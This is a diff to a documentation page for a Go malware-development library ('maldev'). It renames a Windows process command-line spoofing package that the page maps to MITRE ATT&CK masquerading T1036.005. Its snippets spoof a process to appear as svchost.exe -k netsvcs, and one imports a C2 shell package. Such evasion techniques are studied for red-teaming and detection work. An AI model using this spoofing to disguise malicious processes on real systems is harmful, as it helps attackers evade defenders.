@@ -3,7 +3,7 @@
 [<- Back to Evasion](README.md)
 
 **MITRE ATT&CK:** [T1036.005 - Masquerading: Match Legitimate Name or Location](https://attack.mitre.org/techniques/T1036/005/)
-**Package:** `evasion/fakecmd`
+**Package:** `process/tamper/fakecmd`
 **Platform:** Windows
 **Detection:** Low
 
@@ -77,7 +77,7 @@ usermode enumerator sees the new value.
 import (
     "log"
 
-    "github.com/oioio-space/maldev/evasion/fakecmd"
+    "github.com/oioio-space/maldev/process/tamper/fakecmd"
 )
 
 if err := fakecmd.Spoof(`C:\Windows\System32\svchost.exe -k netsvcs`, nil); err != nil {
@@ -127,7 +127,7 @@ import (
     "os/exec"
 
     "github.com/oioio-space/maldev/c2/shell"
-    "github.com/oioio-space/maldev/evasion/fakecmd"
+    "github.com/oioio-space/maldev/process/tamper/fakecmd"
 )
 
 func main() {
